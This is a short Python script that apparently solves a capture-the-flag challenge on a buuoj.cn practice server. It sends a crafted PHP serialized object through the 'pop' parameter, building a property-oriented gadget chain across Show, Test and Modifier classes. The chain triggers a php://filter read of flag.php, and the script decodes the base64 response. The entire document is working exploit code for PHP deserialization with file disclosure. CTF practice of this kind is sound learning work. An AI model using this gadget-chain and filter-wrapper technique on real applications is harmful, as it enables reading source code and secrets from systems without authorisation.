import requests
import base64
url = "http://c5fef424-9b3c-4cdc-89e2-9990ba425f64.node4.buuoj.cn:81/?pop="
payload = 'O:4:"Show":2:{s:6:"source";O:4:"Show":2:{s:6:"source";s:9:"index.php";s:3:"str";O:4:"Test":1:{s:1:"p";O:8:"Modifier":1:{s:6:"\00*\00var";s:57:"php://filter/read=convert.base64-encode/resource=flag.php";}}}s:3:"str";N;}'
res = requests.get(url+payload)
print(base64.b64decode(res.text))
